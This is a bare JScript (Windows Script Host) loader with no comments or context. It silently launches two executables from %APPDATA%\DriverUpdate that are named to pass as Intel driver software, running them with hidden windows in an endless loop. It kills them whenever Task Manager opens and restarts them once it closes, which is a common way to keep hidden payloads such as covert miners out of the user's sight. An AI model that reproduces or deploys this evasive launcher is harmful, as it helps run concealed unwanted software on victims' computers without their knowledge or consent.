var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var WMI = GetObject("winmgmts:");

var roaming = shell.ExpandEnvironmentStrings("%APPDATA%");
var exe1 = roaming + "\\DriverUpdate\\Intel.exe";
var exe2 = roaming + "\\DriverUpdate\\IntelDriver.exe";

var exe1Started = false;
var exe2Started = false;
var startTime = null;

function processRunning(name) {
    var processes = new Enumerator(WMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name='" + name + "'"));
    return !processes.atEnd();
}

function killTargetProcesses() {
    var processes = new Enumerator(WMI.ExecQuery(
        "SELECT * FROM Win32_Process WHERE Name='Intel.exe' OR Name='IntelDriver.exe'"
    ));
    for (; !processes.atEnd(); processes.moveNext()) {
        try {
            processes.item().Terminate();
        } catch (e) {}
    }
}

while (true) {
    try {
        if (processRunning("Taskmgr.exe")) {
            killTargetProcesses();
            exe1Started = false;
            exe2Started = false;
            startTime = null;
        } else {
            if (!exe1Started && fso.FileExists(exe1)) {
                shell.Run('"' + exe1 + '"', 0, false);
                exe1Started = true;
                startTime = new Date().getTime();
            }

            var now = new Date().getTime();

            if (exe1Started && !exe2Started && (now - startTime) >= 3000 && fso.FileExists(exe2)) {
                shell.Run('"' + exe2 + '"', 0, false);
                exe2Started = true;
            }
        }
    } catch (err) {
        
    }

    WScript.Sleep(2000); 
}
